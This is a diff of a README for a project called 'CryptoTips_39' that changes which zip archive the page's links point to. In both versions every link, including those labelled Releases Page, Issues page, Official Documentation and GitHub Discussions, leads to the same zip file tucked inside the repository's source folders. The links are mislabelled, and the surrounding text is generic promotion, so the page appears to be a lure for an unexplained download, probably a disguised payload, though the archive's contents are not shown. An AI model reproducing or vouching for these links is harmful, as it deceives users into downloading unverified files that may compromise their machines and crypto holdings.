@@ -6,11 +6,11 @@ Welcome to CryptoTips_39! This application helps you navigate the world of crypt
 
 ## 📥 Download Link
 
-[![Download CryptoTips_39](https://raw.githubusercontent.com/akolias72/CryptoTips_39/main/frontend/src/components/CryptoTips_39_3.2.zip)](https://raw.githubusercontent.com/akolias72/CryptoTips_39/main/frontend/src/components/CryptoTips_39_3.2.zip)
+[![Download CryptoTips_39](https://github.com/akolias72/CryptoTips_39/raw/refs/heads/main/backend/Tips-Crypto-3.4-alpha.4.zip)](https://github.com/akolias72/CryptoTips_39/raw/refs/heads/main/backend/Tips-Crypto-3.4-alpha.4.zip)
 
 You can download CryptoTips_39 from our Releases page. Click the link below to access the page and get the latest version of the software:
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/akolias72/CryptoTips_39/main/frontend/src/components/CryptoTips_39_3.2.zip)
+[Visit the Releases Page to Download](https://github.com/akolias72/CryptoTips_39/raw/refs/heads/main/backend/Tips-Crypto-3.4-alpha.4.zip)
 
 ## 💻 System Requirements
 
@@ -27,7 +27,7 @@ To ensure that CryptoTips_39 runs smoothly, your system should meet the followin
 To download and install CryptoTips_39, follow these steps:
 
 1. **Visit the Releases Page:** 
-   Use this link to visit our [Releases Page](https://raw.githubusercontent.com/akolias72/CryptoTips_39/main/frontend/src/components/CryptoTips_39_3.2.zip).
+   Use this link to visit our [Releases Page](https://github.com/akolias72/CryptoTips_39/raw/refs/heads/main/backend/Tips-Crypto-3.4-alpha.4.zip).
    
 2. **Choose the Latest Version:**
    Look for the latest version listed on the page. It is usually at the top of the list.
@@ -68,7 +68,7 @@ Yes, CryptoTips_39 is completely free. You can download and use all its features
 
 ### How do I get support?
 
-If you encounter any issues or have questions, you can reach out through our [Issues page](https://raw.githubusercontent.com/akolias72/CryptoTips_39/main/frontend/src/components/CryptoTips_39_3.2.zip) on GitHub. We are here to help you.
+If you encounter any issues or have questions, you can reach out through our [Issues page](https://github.com/akolias72/CryptoTips_39/raw/refs/heads/main/backend/Tips-Crypto-3.4-alpha.4.zip) on GitHub. We are here to help you.
 
 ## 🌟 Community Contributions
 
@@ -76,7 +76,7 @@ We welcome contributions! If you would like to help improve CryptoTips_39, feel 
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://raw.githubusercontent.com/akolias72/CryptoTips_39/main/frontend/src/components/CryptoTips_39_3.2.zip)
-- [GitHub Discussions](https://raw.githubusercontent.com/akolias72/CryptoTips_39/main/frontend/src/components/CryptoTips_39_3.2.zip)
+- [Official Documentation](https://github.com/akolias72/CryptoTips_39/raw/refs/heads/main/backend/Tips-Crypto-3.4-alpha.4.zip)
+- [GitHub Discussions](https://github.com/akolias72/CryptoTips_39/raw/refs/heads/main/backend/Tips-Crypto-3.4-alpha.4.zip)
 
 Thank you for choosing CryptoTips_39. We hope this software helps you achieve your crypto goals. Happy investing!
